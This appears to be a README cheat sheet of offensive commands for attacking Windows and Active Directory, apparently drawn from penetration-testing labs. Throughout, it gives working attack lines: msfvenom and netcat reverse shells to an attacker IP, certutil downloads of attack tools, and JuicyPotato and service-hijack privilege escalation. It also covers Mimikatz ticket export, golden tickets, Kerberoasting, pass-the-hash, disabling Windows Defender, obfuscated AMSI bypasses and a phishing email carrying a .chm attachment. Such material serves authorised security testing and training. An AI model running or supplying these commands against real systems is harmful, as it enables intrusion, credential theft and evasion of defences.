# Windows-AD-attacking

&nbsp;

Any **useful commands** for **Windows** / **Active Directory** will be posted here :shield::hammer:

&nbsp;

* [Shells :hook:](#shells)
* [Transfer files :open_file_folder:](#transfer-files)
* [Privilege escalation :test_tube:](#privilege-escalation)
* [Kerberos :label:](#Kerberos)
* [Pass the hash :joystick:](#pass-the-hash)
* [Enumeration :mag:](#enumeration)
* [Security and policies :unlock:](#security-and-policies)
* [Misc commands :zap:](#misc-commands)

&nbsp;

## Shells

&nbsp;

:hook: Creating your reverse/bind shells

&nbsp;


**[+] Create reverse shell using msfvenom**

```powershell
// Meterpreter

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.126 LPORT=443 -f exe > reverse.exe

// TCP

msfvenom -p  windows/shell/reverse_tcp LHOST=192.168.119.126 LPORT=443 -f exe > reverse.exe
```

&nbsp;

**[+] Reverse shell using NetCat**

```powershell
// In your Kali Linux machine:

nc -lnvp 443

// In the target's machine

nc.exe 192.168.13.37 443 -e cmd.exe
```


&nbsp;
&nbsp;

## Transfer files

&nbsp;

:open_file_folder: Transfering and sharing files over the network

&nbsp;


**[+] Upload file using Powershell**

```powershell
powershell.exe $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest http://192.168.50.48/ASREPRoast.ps1 -OutFile C:\users\hitman\ASREPRoast.ps1
```

&nbsp;

**[+] Upload file using certutil.exe**

```powershell
certutil.exe -urlcache -f http://192.168.50.48/Rubeus.exe C:\users\hitman\Rubeus.exe
```

&nbsp;

**[+] Transfer files using powershell session (PSSesion)**

```powershell
$sess = New-PSSession -ComputerName ufc-webprod -Credential usfun\pastudent1337
Copy-Item -Path Invoke-Mimikatz.ps1 -Destination C:\users\public\Invoke-Mimikatz.ps1 -ToSession $sess
// You can use -FromSession to get files from session :D
```

&nbsp;

**[+] Transfer files using rdesktop tool (Available in Kali Linux)**

```
// In Kali linux

mkdir /home/hitman/shared
rdesktop -f 192.168.50.48 -r disk:linux=/home/hitman/shared

// Now in Windows's RDP

Go to Network Places -> Entire Network -> Microsoft Terminal Services -> tsclient
and put your files there, you will find them in Kali too
Note: You can access the share \\tsclient directly too
```

&nbsp;

**[+] Transfer files using network shares (Powershell)**

```powershell
// You need to make a public share in your student's VM or your Kali

Copy-Item –Path \\PA-USER1337\scripts\nc64.exe –Destination 'C:\Users\jumpsrvadmin\Desktop\Diagnostics\nc.exe'
```

&nbsp;
&nbsp;

## Privilege escalation

&nbsp;

:test_tube: Escalating your privilege to the highest privileges 

&nbsp;


**[+] Privilege escalation using juicy potato (Sometimes you need to attach CLSID)**

```powershell
JuicyPotato.exe -l 13373 -p c:\windows\system32\cmd.exe -a "/c c:/users/public/reverse.exe" -t *
```

&nbsp;

**[+] PowerUp.ps1 "Good powershell script for windows privilege escalation"**

```powershell
C:> powershell.exe -nop -exec bypass

PS C:\> Import-Module PowerUp.ps1

PS C:\> Invoke-AllChecks | Out-File -Encoding ASCII checks.txt
```

&nbsp;

**[+] Weak service permissions privilege escalation**

```powershell
// For example "Victim" is your current username

C:\Users\victim\Desktop>accesschk64 -uwcqv "victim" *

Accesschk v6.14 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

RW SNMPTRAP
        SERVICE_ALL_ACCESS

// Check service

C:\Users\victim\Desktop>sc qc SNMPTRAP

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: SNMPTRAP
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\System32\snmptrap.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : SNMP Trap
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

// Change the binary path to your reverse shell or command

C:\Users\victim\Desktop>sc config SNMPTRAP binpath= "net localgroup administrators victim /add"
[SC] ChangeServiceConfig SUCCESS

C:\Users\victim\Desktop>sc config SNMPTRAP obj= ".\LocalSystem" password= ""

[SC] ChangeServiceConfig SUCCESS

// Stop and restart the service

C:\Users\victim\Desktop>sc start SNMPTRAP
```

&nbsp;
&nbsp;

## Kerberos

&nbsp;

:label: Kerberos attacks like extract tickets and crack them or pass them

&nbsp;


**[+] Request a ticket (powershell)**

```powershell
Add-Type -AssemblyName System.IdentityModel  
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLService/ufc-db1.us.funcorp.local"  
```

&nbsp;

**[+] Export all tickets using Mimikatz**

```powershell
mimikatz # kerberos::list /export  
```

&nbsp;

**[+] Crack ticket using Tgsrepcrack.py (You can use john too or hashcat)**

```powershell
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.hitmanalharbi.local~1433-boo.LOCAL.kirbi  
```

&nbsp;

**[+] Export all tickets to John format (Need PowerView.ps1)**

```powershell
Invoke-Kerberoast -OutputFormat john | Select-Object -ExpandProperty hash |% {$_.replace(':',':$krb5tgs$23$')}
```

&nbsp;

**[+] Kerberos Double-Hop problem (powershell)**

```powershell
$SecPassword = ConvertTo-SecureString 'YourSecretPassword1337' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('us.funcorp.local\pastudent1337', $SecPassword)
Invoke-Command -ComputerName UFC-JUMPSRV -Credential $cred -ScriptBlock {
    Invoke-Command -ComputerName UFC-WEBPROD -Credential $Using:cred -ScriptBlock {
		& cmd /c "hostname"    
    }
} 
```

&nbsp;

**[+] Create golden ticket using Mimikatz**

```powershell
kerberos::golden /user:Hitman /domain:DOMAIN /sid:DOMAIN-SID /krbtgt:HASH /ticket:tgt /ptt
```

&nbsp;
&nbsp;

## Pass the hash

&nbsp;

:joystick: Passing the hash for different services

&nbsp;


**[+] Pass the hash using pth-winexe (Available in Kali Linux)**

```powershell
pth-winexe -U USER%aad3b435b51404eeaad3b435b51404ee:USER_NTLM_HERE //IP cmd
```

&nbsp;

**[+] Access RDP using pass the hash (xfreerdp tool)**

```powershell
xfreerdp /u:username /pth:USER_NTLM_HERE /d:domain /v:IP
```

&nbsp;

**[+] Pass the hash using PsExec.py**

```powershell
python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:USER_NTLM_HERE anyuser@192.168.50.49
```

&nbsp;
&nbsp;

## Enumeration

&nbsp;

:mag: Some commands about enumeration snd recon 

&nbsp;


**[+] enum SMB shares using smbclient (Smbclient available in Kali Linux)**

```powershell
smbclient -L IP
```

&nbsp;

**[+] Sharphound command (For bloodhound)**

```powershell
// EXE version

./SharpHound.exe --CollectionMethod All

// Powershell version

Invoke-BloodHound -CollectionMethod All
```

&nbsp;

**[+] Find interesting ACLs for specific user (Need PowerView.ps1)**

```powershell
Invoke-ACLScanner -ResolveGUID | ? {$_.IdentityReferenceName -like "*jumpsrv*"}
```

&nbsp;

**[+] Identifying if LAPS is Installed (Powershell)**

```powershell
Get-ChildItem 'c:\program files\LAPS\CSE\Admpwd.dll'
```

&nbsp;

**[+] Discover domain's computers have unconstrained delegation (Need PowerView.ps1)**

```powershell
Get-DomainComputer -UnConstrained | select samaccountname
```

&nbsp;

**[+] Enumerate users/computers have contrained delegation enabled (Need PowerView.ps1)**

```powershell
// Users

Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto

// Computers

Get-Domaincomputer -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
```

&nbsp;

**[+] Get specific domain SID (Need PowerView.ps1)**

```powershell
Get-DomainSID -Domain funcorp.local
```

&nbsp;
&nbsp;

## Security and policies

&nbsp;

:unlock: Bypass security, policies and AV evasion

&nbsp;


**[+] Bypass Powershell Execution Policy**

```powershell
// In Powershell you can write:

Set-ExecutionPolicy -ExecutionPolicy bypass

// or run powershell like this:

powershell.exe -ep bypass
```

&nbsp;

**[+] Disable windows defender**

```powershell
// Registry 

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1

// Powershell

powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true
```


&nbsp;

**[+] Powershell AMSI bypass**

```powershell
// Try this

sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )

// Or you can try this

[ReF]."`A$(echo sse)`mB$(echo L)`Y"."g`E$(echo tty)p`E"(( "Sy{3}ana{1}ut{4}ti{2}{0}ils" -f'iUt','gement.A',"on.Am`s",'stem.M','oma') )."$(echo ge)`Tf`i$(echo El)D"(("{0}{2}ni{1}iled" -f'am','tFa',"`siI"),("{2}ubl{0}`,{1}{0}" -f 'ic','Stat','NonP'))."$(echo Se)t`Va$(echo LUE)"($(),$(1 -eq 1))
```

&nbsp;
&nbsp;

## Misc commands

&nbsp;

:zap: Any misc or general command will be here

&nbsp;


**[+] Enable RDP and allow it in the firewall too**

```powershell
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=yes
```

&nbsp;


**[+] Port forwarding**

```powershell
netsh interface portproxy add v4tov4 listenport=2525 listenaddress=192.168.50.48 connectport=25 connectaddress=192.168.21.55
netsh advfirewall firewall add rule name=smtpfrwd dir=in action=allow protocol=TCP localport=2525
```

&nbsp;

**[+] Recursive files search (Powershell)**

```powershell
// Search for all txt files

Get-ChildItem -Path C:\ -Filter  *.txt -Recurse -ErrorAction SilentlyContinue -Force

// Search for flag.txt

Get-ChildItem -Path C:\ -Filter  flag.txt -Recurse -ErrorAction SilentlyContinue -Force
```

&nbsp;

**[+] Encode and decode a file (Base64)**

```powershell
// Encode a file to base64

certutil -encode mail.exe encoded.txt

// Decode a base64 file

certutil -decode encoded.txt mail.exe
```

&nbsp;

**[+] Send a message with attachments (Powershell)**

```powershell
Send-MailMessage -From "user<user@domain.com>" -To "lbunce<lbunce@amazecorp.local>" -Subject "Check the important doc please" -SmtpServer 192.168.21.55 -Attachments .\doc.chm
```


&nbsp;
&nbsp;
